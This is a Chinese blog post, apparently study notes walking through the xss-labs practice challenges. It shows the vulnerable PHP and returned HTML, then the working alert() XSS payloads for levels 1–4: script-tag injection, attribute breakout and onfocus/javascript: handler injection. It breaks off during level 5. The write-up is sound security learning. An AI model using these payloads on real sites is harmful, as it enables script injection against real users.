@@ -1,0 +1,779 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.jpg">
+  <link rel="icon" href="/img/logo.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="aidemofashi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="打一下xss-labslevel 1可以直接用payload: 1&lt;script&gt;alert(&quot;1&quot;)&lt;&#x2F;script&gt;  level 2自己没试出来，去网上找payload，发现闭合型标签注入可用：   1&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt; 源码：    12345">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss-labs-studynotes">
+<meta property="og:url" content="https://aidemofashi.github.io/2025/10/01/xss-labs-studynotes/index.html">
+<meta property="og:site_name" content="aidemofashi&#39;s blog">
+<meta property="og:description" content="打一下xss-labslevel 1可以直接用payload: 1&lt;script&gt;alert(&quot;1&quot;)&lt;&#x2F;script&gt;  level 2自己没试出来，去网上找payload，发现闭合型标签注入可用：   1&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt; 源码：    12345">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-09-30T17:59:18.000Z">
+<meta property="article:modified_time" content="2025-09-30T18:00:05.872Z">
+<meta property="article:author" content="aidemofashi">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>xss-labs-studynotes - aidemofashi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"aidemofashi.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>aidemofashi&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="http://39.105.15.250/aidemofashi_home/index.html" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/main.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="xss-labs-studynotes"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-01 01:59" pubdate>
+          2025年10月1日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          56 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">xss-labs-studynotes</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="打一下xss-labs"><a href="#打一下xss-labs" class="headerlink" title="打一下xss-labs"></a>打一下xss-labs</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>可以直接用payload:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;1&quot;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>自己没试出来，去网上找payload，发现<strong>闭合型标签</strong>注入可用：  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
+<p>源码：   </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level3.php?writing=wait&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level2&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level2.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+<p>分析一下源码，先是有htmlspcialchar来进行转义特殊字符，但是在下面的.$str.没有，所以也不需要考虑绕过<br>如果插入：  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
+<p>会变成：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;input name=keyword  value=<span class="hljs-string">&quot;&#x27;&quot;</span>&gt;&lt;script&gt;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)&lt;/script&gt;<span class="hljs-string">&#x27;&quot;&gt;</span><br></code></pre></td></tr></table></figure>
+<p>这里是先闭合了双引号，再闭合了input的尖括号，最后的script就变成了新元素执行了  </p>
+<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>先尝试：  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">aler</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>查看返回页面原码：  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level4.php?keyword=try harder!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(<span class="hljs-symbol">&amp;quot;</span>1<span class="hljs-symbol">&amp;quot;</span>)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level3.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(<span class="hljs-symbol">&amp;quot;</span>1<span class="hljs-symbol">&amp;quot;</span>)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>&#x27;</span>&gt;</span>	<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level3.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:27<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>全都进行了转义，<br>学习了网上的 onfocus事件绕过<br>在不需要&lt;&gt;的情况下完成绕过，大概就是在用户触发onfocus时会调用 onfocus&#x3D;”myFuncuntion()” 里的myFuncuntion,但是面对未知源码的网站我们不知道有什么确切的函数<br>所以使用JavaScript伪协议进行绕过，<br>JavaScript 协议（javascript:）是一种特殊的 URL 协议，用于在浏览器中直接执行 JavaScript 代码   </p>
+<p>示例用法：  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Hello, World!&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>所以构造payload:  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&#x27; onfocus=javascript:alert(&#x27;</span><span class="hljs-variable constant_">XSS</span><span class="hljs-string">&#x27;) &#x27;</span><br><br>这时候：  <br><br>&lt;input name=keyword  value=<span class="hljs-string">&#x27;114514&#x27;</span>&gt;<br><br>会变成：  <br><br>&lt;input name=keyword  value=<span class="hljs-string">&#x27;finish&#x27;</span> onfocus=<span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>) <span class="hljs-string">&#x27;&#x27;</span>&gt;<br><br>这时候点击输入框触发onfocus就能执行<br></code></pre></td></tr></table></figure>
+
+<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>先查看一下页面源码：  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level5.php?keyword=find a way out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level4<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level4<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和114514相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level4.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;114514&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level4.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:6<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>注意到与level 3 只是 单引号 变成了 双引号   </p>
+<p>遂构造：  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&quot; onfocus=javascript:alert(&#x27;XSS&#x27;) &quot;</span><br></code></pre></td></tr></table></figure>
+<p>完成挑战  </p>
+<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>先看一下前端：  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和find a way out!相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;find a way out!&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level5.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:15<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>怎么感觉，和上一关一样啊？<br>但是：  </p>
